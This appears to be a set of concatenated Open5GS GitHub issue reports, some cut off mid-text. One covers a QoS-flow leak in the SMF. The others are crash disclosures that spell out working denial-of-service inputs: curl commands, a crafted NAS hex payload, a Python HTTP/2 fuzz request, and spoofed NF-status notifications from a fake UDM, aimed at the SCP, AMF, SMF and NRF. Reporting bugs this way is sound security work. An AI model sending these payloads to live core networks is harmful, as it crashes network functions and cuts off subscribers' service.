Any deployment with frequent SmPolicyDecision UpdateNotify churn will reproduce this. We hit it consistently with an IMS workload (Kamailio P-CSCF speaking standard N5 PolicyAuthorization to Open5GS PCF):

1. Two registered IMS UEs, both with PCC rules in MongoDB for 5QI=1 (voice) and 5QI=2 (video).
2. Place a video call (audio + video medComponents in the SDP). P-CSCF creates an AppSession at PCF (`POST /npcf-policyauthorization/v1/app-sessions`).
3. PCF emits `SmPolicyDecision` UpdateNotify to SMF with two PCC rule INSTALLs (IDs like `<dbId>-a<appSessId>`, generated at `src/pcf/npcf-handler.c:946` as `ogs_msprintf("%s-a%s", db_pcc_rule->id, app_session->app_session_id)`).
4. End the call. P-CSCF DELETEs the AppSession at PCF.
5. PCF emits a second UpdateNotify with NULL-valued `PccRuleMap` entries (REMOVE) for those rule IDs.
6. Repeat steps 2–5 several times. SMF eventually logs:
   ```
   ERROR: QosFlow Overflow[4] (../src/smf/binding.c:547)
   WARNING: QosFlow[Id:ims-n2-a85] has already been removed. (../src/smf/binding.c:757)
   WARNING: QosFlow[Id:ims-n2-a84] has already been removed. (../src/smf/binding.c:757)
   ```

## Expected behavior

Per TS 23.503 §6.1.3.2.2, an SmPolicyDecision update is a **delta** over the current authorized set. PCC rules NOT mentioned in a notify should remain unaffected. PCC rules in the notify with NULL value should be REMOVED, and per §6.1.3.2.4 the corresponding QoS Flow should be deleted if it had no other PCC rule bound to it.

## Actual behavior

`update_authorized_pcc_rule_and_qos()` in `src/smf/npcf-handler.c` zeroes the entire policy table on every notify:

```c
if (SmPolicyDecision->pcc_rules) {
    /* … */
    for (i = 0; i < sess->policy.num_of_pcc_rule; i++)
        OGS_PCC_RULE_FREE(&sess->policy.pcc_rule[i]);
    sess->policy.num_of_pcc_rule = 0;

    OpenAPI_list_for_each(SmPolicyDecision->pcc_rules, node) {
        /* rebuild policy.pcc_rule[] from scratch from the new map */
    }
}
```

Then `smf_qos_flow_binding(sess)` (called by the SmPolicyControl create/update handler) iterates the rebuilt `policy.pcc_rule[]`. For TYPE_REMOVE entries it does:

```c
qos_flow = smf_qos_flow_find_by_pcc_rule_id(sess, pcc_rule->id);
if (!qos_flow) {
    ogs_warn("No need to send 'Session Modification Request'");
    ogs_warn("  - QosFlow[Id:%s] has already been removed.", pcc_rule->id);
    continue;
}
```

If the DELETE-notify arrives after a subsequent CREATE-notify (the rebuild already happened), the rule the DELETE-notify wants to REMOVE is no longer in policy.pcc_rule[] — but the corresponding entry in `sess->bearer_list` is **never reaped**, because `bearer_list` is keyed by `qos_flow->pcc_rule.id`, not by what's in `policy.pcc_rule[]`. The qos_flow stays orphaned.

Eventually:

```c
if (ogs_list_count(&sess->bearer_list) >= OGS_MAX_NUM_OF_BEARER) {
    ogs_error("QosFlow Overflow[%d]", ogs_list_count(&sess->bearer_list));
    continue;   /* the new flow is never created */
}
```

with `OGS_MAX_NUM_OF_BEARER = 4` (`lib/proto/types.h:32`).

For the new INVITE that triggered this, the audio/video medComponents either land short (only audio installs, video is dropped) or both are dropped — the term UE sees the QoS preconditions fail and returns `580 Precondition Failure`.

## Why the race window exists

PCC rule IDs in `src/pcf/npcf-handler.c:946` are formed as `<dbId>-a<appSessId>`, so each call generates unique rule IDs. Concurrent or rapidly-sequential AppSession lifecycle events arrive at SMF as separate `SmPolicyDecision` notifies. Each notify rebuilds the policy table before processing its own contents, so a late-arriving DELETE-notify for AppSession N can find that policy.pcc_rule[] no longer contains its rule (it was wiped by the CREATE-notify for AppSession N+1).

## Proposed fix

Two paths, ordered by spec-cleanness:

**Cleanest (spec-aligned):** treat `SmPolicyDecision.pcc_rules` as an incremental delta. Don't zero `policy.pcc_rule[]`. Walk the incoming map: entries with non-NULL value INSTALL/MODIFY (replacing or adding to the existing policy table); entries with NULL value REMOVE. Rules already in the table that are absent from the notify stay unchanged. This brings `update_authorized_pcc_rule_and_qos()` into compliance with TS 23.503 §6.1.3.2.2.

**Less invasive (still compliant):** keep the rebuild loop, but BEFORE wiping, snapshot the current `policy.pcc_rule[]`. After rebuild, walk `sess->bearer_list` — for any qos_flow whose `pcc_rule.id` is in the snapshot but not in the new `policy.pcc_rule[]` AND was not explicitly REMOVED in the notify, emit a synthesized REMOVE entry. (My team attempted a variant of this without the snapshot/explicit-REMOVE distinction; the naive form misidentifies static IMS PCC rules — `ims-n1`, `ims-n2`, provisioned at PDU-session-create time and not present in per-call AppSession notifies — as orphans, leading to over-reaping. The snapshot approach avoids this by only acting on rules that were transiently authorized.)

Separately, `OGS_MAX_NUM_OF_BEARER = 4` in `lib/proto/types.h:32` is conservative even without a leak — TS 23.501 §5.7.1.1 places no explicit per-PDU-session cap below the QFI bit-width ceiling of 64, and only Unstructured-type PDU sessions have the explicit "*maximum one 5G QoS Flow per PDU Session*" restriction (§5.7.3). We've bumped it to 16 locally as a stopgap; suggest bumping upstream to a more realistic value (e.g. 16 or 32) regardless of how the leak is fixed, with proportional bumps to `OGS_MAX_NUM_OF_PCC_RULE` and `OGS_BEARER_PER_UE`.

## Related (existing) reports

- Issue [#869](https://github.com/open5gs/open5gs/issues/869) — VoLTE multi-bearer with call-hold breakage. Same class of failure (second dedicated bearer goes missing under multi-call churn). Closed `Housekeeping:ToClose` without confirmed fix.
- Issue [#4233](https://github.com/open5gs/open5gs/issues/4233) — SGW-C bearer pool exhaustion crash. Marked `status:already-fixed` for SGW-C; SMF still asserts/overflows.
- Discussion [#2631](https://github.com/open5gs/open5gs/discussions/2631) — SMF crash on multiple PDU session release. Same race-condition class on the AppSession lifecycle. Unanswered since 2023.
- Issue [#2115](https://github.com/open5gs/open5gs/issues/2115) — `smf_npcf_smpolicycontrol_build_delete: Assertion sess->sm_context_ref failed`. Same race-condition class.

Happy to provide additional logs (full SMF/PCF/SCP traces during reproduction) or a minimal reproducing test case if useful. Also have local diffs of the two fix paths described above (the conservative one is already running on our deployment) — can submit as a PR if maintainers prefer.

items.title: SCP crashes with SIGSEGV when processing mutated SBI requests during NF registration/deregistration cycle
items.body:
### Open5GS Release, Revision, or Tag

v2.7.6(Docker image `open5gs-fuzz:latest`）

### Steps to reproduce

The SCP (Service Communication Proxy) crashes with SIGSEGV (exit code 139) when receiving mutated SBI HTTP/2 requests that arrive during the NF registration/deregistration cycle.

**Environment:**
- Docker deployment, bridge network 172.23.0.0/16
- NFs: NRF (172.23.0.10:7777), SCP (172.23.0.110:7777), plus AMF/SMF/AUSF/UDM/UDR/PCF/NSSF/BSF/UPF
- All NFs communicate via HTTP/2 SBI

**Reproduction steps:**

1. Start all Open5GS containers (docker-compose or equivalent)
2. Send mutated SBI HTTP/2 requests targeting the SCP's indirect communication endpoints:
   ```python
   import socket, ssl, h2.connection, h2.config
   
   SCP_HOST = "172.23.0.110"
   SCP_PORT = 7777
   
   # Connect with HTTP/2
   sock = socket.create_connection((SCP_HOST, SCP_PORT), timeout=10)
   ctx = ssl.create_default_context()
   ctx.check_hostname = False
   ctx.verify_mode = ssl.CERT_NONE
   ssock = ctx.wrap_socket(sock, server_hostname=SCP_HOST)
   
   config = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
   conn = h2.connection.H2Connection(config=config)
   conn.initiate_connection()
   ssock.sendall(conn.data_to_send())
   
   # Send mutated NFRegister via SCP (indirect communication)
   headers = [
       (':method', 'PUT'),
       (':path', '/nnrf-nfm/v1/nf-instances/AMF-fuzz-\x00\x00\x00\x00'),
       (':authority', f'{SCP_HOST}:{SCP_PORT}'),
       (':scheme', 'http'),
       ('content-type', 'application/json'),
   ]
   body = json.dumps({
       "nfInstanceId": "AMF-fuzz-\x00\x00\x00\x00",
       "nfType": "AMF\t\t\t\t\t\t\t\t\t\t",
       "nfStatus": "REGISTERED",
       "ipv4Addresses": ["172.23.0.20"],
   }).encode()
   
   headers.append(('content-length', str(len(body))))
   sid = conn.get_next_available_stream_id()
   conn.send_headers(sid, headers)
   conn.send_data(sid, body, end_stream=True)
   ssock.sendall(conn.data_to_send())
   ```
3. The SCP exits with code 139 within 60 seconds of fuzzer startup. This was confirmed reproducible across multiple fuzzer campaigns — upon restart, the SCP crashed again within 60 seconds.

Note:This crash was triggered by automated fuzzing using `type_confusion` and `grammar_aware` mutation strategies. The exact payload that triggers the crash may vary, but the crash is consistent: any sustained fuzzing of SCP's SBI endpoints causes exit 139 within the first minute.

### Logs

```shell
$ docker ps -a | grep open5gs-scp
fuzzing-open5gs-scp   Exited (139) 37 hours ago

$ docker inspect fuzzing-open5gs-scp --format '{{.State.ExitCode}}'
139

$ docker logs fuzzing-open5gs-scp --tail 30
[sbi] WARNING: [uuid] Retry registration with NRF (../lib/sbi/nf-sm.c:256)
[sbi] WARNING: Couldn't connect to server (7): Failed to connect to 172.23.0.10 
  port 7777 after 0 ms: Connection refused (../lib/sbi/client.c:767)
[sbi] WARNING: ogs_sbi_client_handler() failed [-1] (../lib/sbi/path.c:62)
... (NF registration retry loop) ...
(container exits with 139 = SIGSEGV, no explicit assertion message captured)
```

### Expected behaviour

The SCP should gracefully handle malformed or unexpected SBI requests by returning HTTP 400 (Bad Request) or HTTP 500 (Internal Server Error) without crashing. Network functions handling indirect communication should never exit on malformed input.


### Observed Behaviour

The SCP process terminates with exit code 139 (SIGSEGV) when processing mutated SBI requests during the NF registration/deregistration cycle. The crash renders the SCP unavailable — all indirect communication through the SCP is disrupted until the container is restarted.

### eNodeB/gNodeB

_No response_

### UE Models and versions

_No response_

items.title: [Bug]: AMF crash on UE-driven `nudm-sdm` `am-data` response with oversized `gpsis`

labels.name: status:already-fixed
labels.description: This issue has already been fixed in the codebase or addressed in a previous issue.

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Description

AMF crashes during a real UE registration flow when the `Nudm_SDM` `am-data`
response contains too many `gpsis` entries of type `msisdn-*`.

This path is UE-driven: the crash is only reached after an external UE starts a
normal 5G registration procedure and AMF issues:

```text
GET /nudm-sdm/v2/{supi}/am-data
```

inside `amf_nudm_sdm_handle_provisioned()`.

The root cause is a fixed-size array overflow in the AMF-side UDM response
parser:

```c
if (gpsiList) {
    OpenAPI_list_for_each(gpsiList, node) {
        ...
        if (strncmp(gpsi, OGS_ID_GPSI_TYPE_MSISDN,
                strlen(OGS_ID_GPSI_TYPE_MSISDN)) == 0) {
            amf_ue->msisdn[amf_ue->num_of_msisdn] =
                ogs_id_get_value(node->data);
            ogs_assert(amf_ue->msisdn[amf_ue->num_of_msisdn]);
            amf_ue->num_of_msisdn++;
        }
    }
}
```

at `../src/amf/nudm-handler.c:55-69`.

The destination array only has capacity `OGS_MAX_NUM_OF_MSISDN == 2`:

```c
#define OGS_MAX_NUM_OF_MSISDN 2
```

at `../lib/proto/types.h:876-880`.

There is no bounds check before incrementing `amf_ue->num_of_msisdn`, so an
oversized `gpsis` list corrupts adjacent AMF UE state during registration. In
the confirmed run, the corruption manifested immediately afterwards as bogus
PLMN values in `No Allowed-NSSAI` diagnostics, followed by an AMF segmentation
fault.

This is not a duplicate of the existing AMF reports under `report/amf/`: it is
a different entry chain, different trust boundary, and different root-cause
site from the already documented `namf-comm`, `namf-callback`, and `nnrf-*`
issues.

### Root cause

- Entry chain:
  external UE registration
  -> AMF `PUT /nudm-uecm/.../amf-3gpp-access`
  -> AMF `GET /nudm-sdm/v2/{supi}/am-data`
  -> `amf_nudm_sdm_handle_provisioned()`
- Root-cause site:
  `../src/amf/nudm-handler.c:55-69`
- Fixed target:
  `../lib/proto/types.h:876-880`
- Root cause family:
  fixed-size array overflow / out-of-bounds write
- Controlling field:
  `AccessAndMobilitySubscriptionData.gpsis`

### Steps to Reproduce

1. Start the Open5GS Docker lab and ensure these containers are running:

```bash
docker start db ausf udm udr pcf smf upf amf nssf
```

2. Confirm the subscriber exists in MongoDB. In my live run, the existing test
subscriber was:

```text
IMSI: 001011234567891
```

3. Start a real gNB and UE with the bundled UERANSIM configs:

```bash
docker run --rm -d --name amf-audit-gnb --network open5gs \
  --network-alias gnb.ueransim.org \
  -v /home/ubuntu/docker-open5gs/configs/internal/ueransim/gnb.yaml:/ueransim/config/gnb.yaml:ro \
  free5gc/ueransim:latest /ueransim/nr-gnb -c /ueransim/config/gnb.yaml

docker run --rm -d --name amf-audit-ue --network open5gs \
  --network-alias ue.ueransim.org \
  --cap-add NET_ADMIN --device /dev/net/tun:/dev/net/tun \
  -v /home/ubuntu/docker-open5gs/configs/internal/ueransim/ue.yaml:/ueransim/config/ue.yaml:ro \
  free5gc/ueransim:latest /ueransim/nr-ue -c /ueransim/config/ue.yaml -r
```

4. Start the fake UDM helper on the host:

```bash
node /home/ubuntu/open5gs_277/.audit_tmp/amf_fake_udm.js
```

5. Replace the real UDM in AMF's local cache with the fake UDM:

```bash
AMF_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' amf)

curl --http2-prior-knowledge -sS -i -m 8 \
  -X POST "http://$AMF_IP/nnrf-nfm/v1/nf-status-notify" \
  -H 'content-type: application/json' \
  --data '{"event":"NF_DEREGISTERED","nfInstanceUri":"http://nrf.open5gs.org/nnrf-nfm/v1/nf-instances/4568f3be-3644-41f1-bff0-3b335fd843b5"}'

curl --http2-prior-knowledge -sS -i -m 8 \
  -X POST "http://$AMF_IP/nnrf-nfm/v1/nf-status-notify" \
  -H 'content-type: application/json' \
  --data '{"event":"NF_REGISTERED","nfInstanceUri":"http://10.33.33.1:18083/nnrf-nfm/v1/nf-instances/fake-udm-amf","nfProfile":{"nfInstanceId":"fake-udm-amf","nfType":"UDM","nfStatus":"REGISTERED","fqdn":"fake-udm-amf.local","ipv4Addresses":["10.33.33.1"],"allowedNfTypes":["SCP","AMF","SMF","AUSF"],"priority":0,"capacity":100,"load":0,"nfServices":[{"serviceInstanceId":"fake-udm-ueau","serviceName":"nudm-ueau","versions":[{"apiVersionInUri":"v1","apiFullVersion":"1.0.0"}],"scheme":"http","nfServiceStatus":"REGISTERED","ipEndPoints":[{"ipv4Address":"10.33.33.1","port":18083}],"allowedNfTypes":["AUSF"],"priority":0,"capacity":100,"load":0},{"serviceInstanceId":"fake-udm-uecm","serviceName":"nudm-uecm","versions":[{"apiVersionInUri":"v1","apiFullVersion":"1.0.0"}],"scheme":"http","nfServiceStatus":"REGISTERED","ipEndPoints":[{"ipv4Address":"10.33.33.1","port":18083}],"allowedNfTypes":["AMF","SMF"],"priority":0,"capacity":100,"load":0},{"serviceInstanceId":"fake-udm-sdm","serviceName":"nudm-sdm","versions":[{"apiVersionInUri":"v2","apiFullVersion":"2.0.0"}],"scheme":"http","nfServiceStatus":"REGISTERED","ipEndPoints":[{"ipv4Address":"10.33.33.1","port":18083}],"allowedNfTypes":["AMF","SMF"],"priority":0,"capacity":100,"load":0}]}}'
```

6. Control experiment: configure the fake UDM for a single normal `gpsi`, then
restart the UE and wait for successful registration:

```bash
printf 'control\n' > /home/ubuntu/open5gs_277/.audit_tmp/amf_fake_udm.mode
docker restart amf-audit-ue
docker logs --tail 60 amf-audit-ue
docker inspect -f '{{.State.Status}} {{.State.ExitCode}}' amf
```

In my live run, the fake UDM received the full UDM sequence and the UE reached
successful registration plus PDU session establishment.

7. Malicious experiment: change only the fake UDM mode so `am-data` returns
`16` `msisdn-*` `gpsis`, then restart the UE again:

```bash
printf 'am-data-gpsi-overflow\n' > /home/ubuntu/open5gs_277/.audit_tmp/amf_fake_udm.mode
docker restart amf-audit-ue
```

items.title: [Bug]: SMF crash on `POST /nsmf-pdusession/v1/sm-contexts/{smContextRef}/modify` with empty packet-filter content in `n1SmMsg` QoS rules

labels.name: status:already-fixed
labels.description: This issue has already been fixed in the codebase or addressed in a previous issue.

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce


### Description

SMF crashes when a `PDU Session Modification Request` delivered through
`SmContextUpdateData.n1SmMsg` carries a syntactically valid
`requested_qos_rules` IE whose packet filter list contains one packet filter
with `content.length = 0`.

`ogs_nas_parse_qos_rules()` accepts the rule and leaves
`rule->pf[i].content.num_of_component = 0`. Later
`gsm_handle_pdu_session_modification_qos_rules()` allocates a packet filter and
asserts that reconfiguration produced at least one component:

```c
pf = smf_pf_add(qos_flow);
ogs_assert(pf);

ogs_assert(reconfigure_packet_filter(pf, &qos_rule[i], i) > 0);
```

For an empty packet-filter content, `reconfigure_packet_filter()` returns `0`,
so the assertion aborts the SMF process.

This issue is distinct from the `invalid bitrate unit` bug above: that one is
in QoS flow description bitrate conversion, while this one is an assert on the
QoS rule packet-filter business logic.

### Steps to reproduce

1. Start the Docker lab and ensure `smf` and `smf-audit-ue` are running.
2. Resolve the current SMF container IP and an active `smContextRef`:

```bash
SMF_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' smf)
docker restart smf-audit-ue >/dev/null
sleep 3

REF=$(
  for i in $(seq 1 30); do
    code=$(curl --http2-prior-knowledge -m 5 -sS -o /tmp/probe.body -w '%{http_code}' \
      -X POST "http://$SMF_IP/nsmf-pdusession/v1/sm-contexts/$i/modify" \
      -H 'Content-Type: application/json' \
      --data '{"hoState":"COMPLETED"}')
    if [ "$code" != 404 ]; then
      echo "$i"
      break
    fi
  done
)
echo "SMF_IP=$SMF_IP REF=$REF"
```

3. Prepare a multipart `SmContextUpdateData` with only `n1SmMsg`, using the
malicious NAS payload below. The payload is a `PDU Session Modification
Request` whose `requested_qos_rules` uses
`MODIFY_EXISTING_QOS_RULE_AND_ADD_PACKET_FILTERS`, but the only packet filter
has `content.length = 0`:

```bash
python3 - <<'PY'
from pathlib import Path
import json

boundary = 'REQBOUNDARY'
body = {'n1SmMsg': {'contentId': '5gnas-sm'}}
n1 = bytes.fromhex('2e0101c97a00080100056120000f01')

parts = []
parts.append(
    (f'--{boundary}\r\nContent-Type: application/json\r\n\r\n'.encode()) +
    json.dumps(body, separators=(',', ':')).encode() + b'\r\n'
)
parts.append(
    (f'--{boundary}\r\nContent-Id: 5gnas-sm\r\n'
     f'Content-Type: application/vnd.3gpp.5gnas\r\n\r\n'.encode()) +
    n1 + b'\r\n'
)
parts.append(f'--{boundary}--\r\n'.encode())

Path('/tmp/smctx_modify_empty_pf.multipart').write_bytes(b''.join(parts))
PY
```

4. Send the request:

```bash
curl --http2-prior-knowledge -m 10 -sS -i \
  -X POST "http://$SMF_IP/nsmf-pdusession/v1/sm-contexts/$REF/modify" \
  -H 'Content-Type: multipart/related; boundary=REQBOUNDARY' \
  --data-binary @/tmp/smctx_modify_empty_pf.multipart
```

5. Check the SMF process state and logs:

```bash
docker inspect -f '{{.State.Status}} {{.State.ExitCode}} {{.State.FinishedAt}}' smf
docker logs --tail 120 smf
```

### Logs

```shell
Client side:


curl: (56) Recv failure: Connection reset by peer


SMF state:


exited 139 2026-04-11T07:54:37.832480109Z


SMF log:


04/11 07:54:37.740: [gsm] FATAL: gsm_handle_pdu_session_modification_qos_rules: Assertion `reconfigure_packet_filter(pf, &qos_rule[i], i) > 0' failed. (../src/smf/gsm-handler.c:274)
```

### Expected behaviour

SMF should reject QoS rules whose packet filter content is empty and return a
normal protocol error for that request.

### Observed Behaviour

The crafted `n1SmMsg` aborts the entire SMF process before any HTTP response is
completed, resetting the client connection and terminating the SMF container
with exit code `139`.

### eNodeB/gNodeB

Not required.

### UE Models and versions

Not required.

items.title: [Bug]: SMF crash on `POST /nsmf-pdusession/v1/vsmf-pdu-session/{smContextRef}/modify` against a non-home-routed session

labels.name: status:already-fixed
labels.description: This issue has already been fixed in the codebase or addressed in a previous issue.

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce

### Description

SMF accepts `POST /nsmf-pdusession/v1/vsmf-pdu-session/{smContextRef}/modify`
for an ordinary non-home-routed session and later aborts when trying to build
the N2 modification message.

The server-side route only checks that the `smContextRef` exists:

```c
sess = smf_sess_find_by_sm_context_ref(
        sbi_message.h.resource.component[1]);
...
ogs_fsm_dispatch(&sess->sm, e);
```

There is no precondition that the target session is actually a V-SMF
home-routed session.

Inside `smf_nsmf_handle_update_data_in_vsmf()`, the request populates
`sess->h_smf_qos_flows_add_mod_request_list` and then unconditionally calls:

```c
param.n2smbuf =
    ngap_build_pdu_session_resource_modify_request_transfer(sess,
        qosFlowProfile->gbr_qos_flow_info ? true : false);
ogs_assert(param.n2smbuf);
```

But `ngap_build_pdu_session_resource_modify_request_transfer()` switches on
`HOME_ROUTED_ROAMING_IN_VSMF(sess)`. For a normal non-HR session that is
`false`, so it ignores the supplied V-SMF list and instead iterates
`sess->qos_flow_to_modify_list`, which is empty in this path. ASN.1 encoding
then fails and `param.n2smbuf` stays `NULL`, triggering a fatal assertion.

This issue is distinct from the separate `missing qosFlowProfile` report. Here
the request includes a valid `qosFlowProfile`, but the route still aborts
because the handler is reachable on a session type it was not designed for.

### Steps to reproduce

1. Start the Open5GS Docker lab and establish a normal SMF session using the
existing UERANSIM containers:

```bash
docker restart smf-audit-ue
docker logs --tail 30 smf-audit-ue
```

Wait until the UE log shows:

```text
PDU Session establishment is successful PSI[1]
```

2. Identify the active `smContextRef`. In this run it was `1`:

```bash
for id in 1 2 3 4 5 6; do
  code=$(curl --http2-prior-knowledge -m 3 -s -o /tmp/out.$$ -w '%{http_code}' \
    -X POST http://10.33.33.10/nsmf-callback/v1/sm-policy-notify/${id}/update \
    -H 'content-type: application/json' \
    --data '{"smPolicyDecision":{}}')
  printf '%s %s\n' "$id" "$code"
done
```

3. Send a `vsmf-pdu-session` modify request with a syntactically valid
`qosFlowProfile`:

```bash
payload=$(python3 - <<'PY'
import json
body = {
  "requestIndication": "NW_REQ_PDU_SES_MOD",
  "qosFlowsAddModRequestList": [
    {
      "qfi": 1,
      "qosFlowDescription": "permit out ip from 10.0.0.1 1000 to any",
      "qosFlowProfile": {
        "5qi": 1,
        "arp": {
          "priorityLevel": 1,
          "preemptCap": "NOT_PREEMPT",
          "preemptVuln": "NOT_PREEMPTABLE"
        }
      }
    }
  ]
}
print(json.dumps(body, separators=(",", ":")))
PY
)

curl --http2-prior-knowledge -m 5 -sS -i \
  -X POST http://10.33.33.10/nsmf-pdusession/v1/vsmf-pdu-session/1/modify \
  -H 'content-type: application/json' \
  --data "$payload"
```

4. Check SMF state and logs:

```bash
docker inspect -f '{{.State.Status}} {{.State.ExitCode}} {{.State.FinishedAt}}' smf
docker logs --since 2026-04-10T21:02:06Z smf
```

### Logs

```shell
curl: (92) HTTP/2 stream 1 was not closed cleanly before end of the underlying stream



exited 139 2026-04-10T21:02:16.719914951Z



04/10 21:02:16.629: [core] ERROR: Failed to encode ASN-PDU [-1] (../lib/asn1c/util/message.c:42)
04/10 21:02:16.629: [smf] FATAL: smf_nsmf_handle_update_data_in_vsmf: Assertion `param.n2smbuf' failed. (../src/smf/nsmf-handler.c:2539)
```

### Expected behaviour

SMF should reject `vsmf-pdu-session` requests for non-home-routed sessions with
a normal HTTP error response.

### Observed Behaviour

The request drives the SMF into an ASN.1 build failure and the process exits
with code `139`.

### eNodeB/gNodeB

Not required.

### UE Models and versions

Not required.

items.title: [Bug]: AMF crash after oversized `smf-select-data` `dnnInfos` import via later subscribed-info cleanup

labels.name: status:already-fixed
labels.description: This issue has already been fixed in the codebase or addressed in a previous issue.

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Description

AMF can be driven into a later assertion abort when a malicious UDM returns an
oversized `dnnInfos` list in:

```text
GET /nudm-sdm/v2/{supi}/smf-select-data
```

The import path in `amf_nudm_sdm_handle_provisioned()` copies each
`DnnInfoList` entry into:

```c
ogs_session_t *session = &slice->session[slice->num_of_session];
session->name = ogs_strdup(DnnInfo->dnn);
slice->num_of_session++;
```

at `../src/amf/nudm-handler.c:219-230` with no bound check against
`OGS_MAX_NUM_OF_SESS == 4`.

That means a valid but oversized UDM response can push
`amf_ue->slice[i].num_of_session` far past the fixed per-slice session array
limit. The corrupted imported state later aborts as soon as AMF cleanup reaches
`amf_clear_subscribed_info()`:

```c
ogs_assert(amf_ue->slice[i].num_of_session <= OGS_MAX_NUM_OF_SESS);
```

at `../src/amf/context.c:2763`.

This is distinct from the already documented AMF reports. It is not the
existing `NNRF smfInfo.dnnSmfInfoList` crash family, and it is not the earlier
live `smf-select-data` experiment that only showed `Ignore max session count
overflow` later in `gmm-handler.c`. The root cause here is the unbounded import
in `nudm-handler.c` and the later cleanup-time assertion in `context.c`.

### Root Cause

- Entry chain:
  UE registration
  -> AMF `GET /nudm-sdm/v2/{supi}/smf-select-data`
  -> `amf_nudm_sdm_handle_provisioned()`
  -> unbounded `slice->session[slice->num_of_session]` writes
  -> later `amf_clear_subscribed_info()`
- Crash site:
  `../src/amf/context.c:2763`
- Root cause family:
  unbounded imported list length causing later cleanup-time assertion
- Controlling field:
  `SmfSelectionSubscriptionData.subscribedSnssaiInfos[*].dnnInfos[*]`

### Steps to Reproduce

1. Start the Open5GS Docker lab and ensure these containers are running:

```bash
docker start db ausf udm udr pcf smf upf amf nssf
```

2. Confirm the subscriber exists in MongoDB. In my live run, the existing test
subscriber was:

```text
IMSI: 001011234567891
```

3. Start the fake UDM helper in the same `open5gs` Docker network. In my live
run on 2026-04-12 the fake UDM container IP was `10.33.33.13`:

```bash
docker run -d --name amf-fake-udm --network open5gs \
  -v /home/ubuntu/open5gs_277/.audit_tmp:/work \
  node:20-alpine sh -lc '
    IP=$(hostname -i | awk "{print \$1}")
    export AMF_FAKE_UDM_HOST_IP=$IP AMF_FAKE_UDM_PORT=18083
    export AMF_FAKE_UDM_MODE_FILE=/work/amf_fake_udm.mode
    export AMF_FAKE_UDM_LOG_FILE=/work/amf_fake_udm.log
    node /work/amf_fake_udm.js'
```

4. Control experiment: fresh AMF, replace the AMF-local real UDM entry with the
fake UDM, then perform one normal UE registration:

```bash
docker rm -f amf-audit-gnb amf-audit-ue || true
docker restart amf

curl --http2-prior-knowledge -sS -i -m 8 \
```

items.body:
### Open5GS Release, Revision, or Tag

v2.7.5

### Steps to reproduce

To reproduce, execute:

curl --http2-prior-knowledge -v -X PUT "http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/deadbeef-dead-beef-dead-beefdeadbeef" -H "Content-Type: application/json" --data '{"nfInstanceId": "deadbeef-dead-beef-dead-beefdeadbeef", "nfType": "UDR", "nfStatus": "REGISTERED"}'


This reveals a flaw in the ogs_sbi_client_associate function. When a new NF instance is registered, this function is called to set up the necessary client-side communication context. It appears the function nf_instance_find_client (called by ogs_sbi_client_associate) fails to create or find a valid client for the unhandled NF type (UDR). This results in a NULL pointer being passed to ogs_sbi_client_associate, which then triggers the ogs_assert(client) failure, terminating the process.

items.body:
### Open5GS Release, Revision, or Tag

v2.7.5

### Steps to reproduce

To reproduce, execute:
curl --http2-prior-knowledge -X PUT http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/a93289c8-b1c4-4b32-a15b-5a6552885895 --header 'Content-Type: application/json' --data-raw "$(python3 -c 'import json; item = {"sNssai": {"sst": 1}, "dnnSmfInfoList": [{"dnn": "internet"}]}; data = {"nfInstanceId": "a93289c8-b1c4-4b32-a15b-5a6552885895", "nfType": "SMF", "nfStatus": "REGISTERED", "smfInfo": {"sNssaiSmfInfoList": [item] * 9}}; print(json.dumps(data))')"

The handle_smf_info function in src/nrf/nnrf-nfm-handler.c processes the smfInfo object from an NF Profile registration request. Within this function, it iterates over the s_nssai_smf_info_list, which is an array provided in the JSON payload of the HTTP request. An ogs_assert(nf_info->smf.num_of_slice < OGS_MAX_NUM_OF_SLICE) statement is used to check if the number of processed array elements exceeds a predefined limit (OGS_MAX_NUM_OF_SLICE).

Because the size of the s_nssai_smf_info_list array is controlled by the client, an attacker can send a request where the number of elements is greater than OGS_MAX_NUM_OF_SLICE. This causes the assertion to fail, which in turn calls abort() and terminates the entire server process, resulting in a Denial of Service.

items.body:
### Open5GS Release, Revision, or Tag

v2.7.5

### Steps to reproduce

To reproduce, execute:
PAYLOAD=$(python3 -c 'import json; print(json.dumps({

    "nfType": "AMF",
    "nfStatus": "REGISTERED",
    "amfInfo": {
      "amfSetId": "1",
      "amfRegionId": "1",
      "guamiList": [
        {"plmnId": {"mcc": "001", "mnc": "01"}, "amfId": "1"},
        {"plmnId": {"mcc": "001", "mnc": "01"}, "amfId": "2"},
        {"plmnId": {"mcc": "001", "mnc": "01"}, "amfId": "3"},

        {"plmnId": {"mcc": "001", "mnc": "01"}, "amfId": "9"},
        {"plmnId": {"mcc": "001", "mnc": "01"}, "amfId": "10"},
        {"plmnId": {"mcc": "001", "mnc": "01"}, "amfId": "11"},
        {"plmnId": {"mcc": "001", "mnc": "01"}, "amfId": "12"},
        {"plmnId": {"mcc": "001", "mnc": "01"}, "amfId": "13"},
        {"plmnId": {"mcc": "001", "mnc": "01"}, "amfId": "14"},
        {"plmnId": {"mcc": "001", "mnc": "01"}, "amfId": "15"},
        {"plmnId": {"mcc": "001", "mnc": "01"}, "amfId": "16"},
        {"plmnId": {"mcc": "001", "mnc": "01"}, "amfId": "17"}
      ]
    }
  }
}))')

curl -i -X POST \
     -H "Content-Type: application/json" \
     --http2-prior-knowledge \
     --data "$PAYLOAD" \
     http://127.0.0.5:7777/nnrf-nfm/v1/nf-status-notify


The handle_amf_info() function processes incoming AMF profiles, which can be received via an NRF notification. This function iterates over a guamiList provided in the request payload. Inside the loop, it uses ogs_assert(nf_info->amf.num_of_guami < OGS_MAX_NUM_OF_SERVED_GUAMI) to validate the number of GUAMI entries. An assertion is a debugging tool that intentionally crashes the program if its condition is false. Because the guamiList is controllable by an external entity, an attacker can send a list with more entries than the allowed maximum (OGS_MAX_NUM_OF_SERVED_GUAMI, which is 16). This triggers the assertion, causing the AMF process to terminate immediately.

items.title: [Feature Request] Roaming agreement in Open5GS DB
items.body:
Hi everyone, I am not really sure if this should be an issue or a discussion so feel free to move it to the correct place.

